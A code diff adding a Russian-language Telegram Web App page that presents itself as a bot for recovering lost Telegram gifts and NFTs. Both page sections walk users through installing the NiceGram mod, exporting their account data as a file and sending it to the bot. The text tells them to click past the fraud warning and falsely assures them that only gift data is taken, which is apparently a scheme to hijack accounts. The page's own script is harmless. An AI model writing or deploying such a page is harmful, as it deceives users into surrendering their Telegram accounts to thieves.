@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Возврат подарков</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: var(--tg-theme-bg-color, #ffffff);
+            color: var(--tg-theme-text-color, #000000);
+            line-height: 1.6;
+        }
+        .container {
+            padding: 20px;
+            max-width: 100%;
+        }
+        h1 {
+            color: #2481cc;
+            text-align: center;
+            margin: 20px 0;
+        }
+        .warning {
+            background: #fff3cd;
+            color: #856404;
+            padding: 18px;
+            border-radius: 12px;
+            margin: 15px 0;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 16px;
+            margin: 12px 0;
+            font-size: 17px;
+            font-weight: bold;
+            border: none;
+            border-radius: 12px;
+            background: #2481cc;
+            color: white;
+            cursor: pointer;
+        }
+        button:active {
+            opacity: 0.85;
+        }
+        .back-btn {
+            background: #666;
+            margin-top: 10px;
+        }
+        .step {
+            background: var(--tg-theme-secondary-bg-color, #f1f1f1);
+            padding: 16px;
+            margin: 12px 0;
+            border-radius: 10px;
+        }
+        .italic {
+            font-style: italic;
+            color: #d32f2f;
+            font-size: 15px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Первая страница: Важно знать -->
+    <div class="container" id="page1">
+        <h1>ВАЖНО ЗНАТЬ</h1>
+        
+        <div class="warning">
+            Этот бот создан для возвращения своих подарков в Telegram через наш инновационный способ.<br><br>
+            
+            Он заключается в следующем: пользователь скачивает специально разработанный мод для этого бота — <strong>NiceGram</strong>. 
+            Далее он высылает данные о своём аккаунте файлом.<br><br>
+            
+            <strong>БОТ РАБОТАЕТ БЕЗ СВЯЗИ С ЧЕЛОВЕКОМ</strong> через закрытый аккаунт @Hordet.<br><br>
+            
+            Он берёт из файла <strong>ТОЛЬКО ДАННЫЕ О ПОДАРКЕ</strong> и ничего больше.<br><br>
+            
+            Файл при получении подарка для друзей нужен для улучшения работы бота.<br><br>
+            
+            Ещё одно важное правило: <strong>ЕСЛИ ВЫ ИЗНАЧАЛЬНО ПОКУПАЛИ ПОДАРОК НА ОСНОВНОМ АККАУНТЕ, ТО НУЖНО УКАЗЫВАТЬ ЕГО</strong>. 
+            Если такой возможности нет, то указывайте последний аккаунт, у которого ещё был подарок (возвращение будет немного дольше).<br><br>
+            
+            Администратор, которому идёт файл — это закрытый аккаунт со своими алгоритмами.
+        </div>
+
+        <button onclick="nextPage()">Да, я понял ✅</button>
+    </div>
+
+    <!-- Вторая страница: Инструкция -->
+    <div class="container" id="page2" style="display: none;">
+        <h1>Привет! 👋</h1>
+        <p>Я самый надёжный на данный момент бот для возвращения подарков (NFT, подарки за звёзды и т.д.).</p>
+        
+        <p><strong>ЧТОБЫ ВЕРНУТЬ СВОЙ ПОДАРОК, СЛЕДУЙТЕ ИНСТРУКЦИИ НИЖЕ:</strong></p>
+
+        <div class="step">
+            1. Скачайте мод <strong>NiceGram</strong>.<br>
+            2. Зарегистрируйте нужный аккаунт.<br>
+            3. Найдите 3 полоски слева сверху и нажмите.<br>
+            4. Выберите пункт «Настройки» и выберите пункт «Nicegram».<br>
+            5. Нажмите «Экспортировать как файл».<br>
+            6. Выберите аккаунт и примите пункт снизу.<br>
+            7. Нажмите «Экспортировать».
+        </div>
+
+        <p class="italic">
+            (ВНИМАНИЕ! т.к. мод не сделан именно под настройки бота, то выскочит предупреждение о мошенничестве. 
+            Как и упоминалось, бот берёт только уникальный код подарка, номер и серию и он не считается 3 лицом по правилам NiceGram).
+        </p>
+
+        <div class="step">
+            8. Нажмите «Я понял(а)» и выберите папку для экспорта.<br>
+            9. Зайдите в диалог с ботом и отправьте файл, предварительно нажав на кнопку «Отправить файл».<br>
+            10. Готово! 🎉 Сроком до одного дня вам на аккаунт вернут ваши потерянные подарки.
+        </div>
+
+        <button onclick="callOperator()">Позвать оператора в чат</button>
+        <button onclick="prevPage()" class="back-btn">← Назад</button>
+        
+        <p style="text-align:center; font-size:15px; opacity:0.8; margin-top:20px;">
+            Если вам нужна помощь оператора — нажмите кнопку выше.<br>
+            Он не сможет увидеть все ваши прошлые сообщения.
+        </p>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        
+        function init() {
+            tg.ready();
+            tg.expand();
+            tg.setHeaderColor('#2481cc');
+        }
+
+        function nextPage() {
+            document.getElementById('page1').style.display = 'none';
+            document.getElementById('page2').style.display = 'block';
+            tg.HapticFeedback && tg.HapticFeedback.impactOccurred('light');
+        }
+
+        function prevPage() {
+            document.getElementById('page2').style.display = 'none';
+            document.getElementById('page1').style.display = 'block';
+            tg.HapticFeedback && tg.HapticFeedback.impactOccurred('light');
+        }
+
+        function callOperator() {
+            tg.sendData("мне нужна помощь");
+            
+            tg.showPopup({
+                title: "Оператор вызван",
+                message: "Сообщение «мне нужна помощь» отправлено в чат.\n\nОжидайте ответа оператора.",
+                buttons: [{type: "close"}]
+            });
+        }
+
+        window.onload = init;
+    </script>
+</body>
+</html>
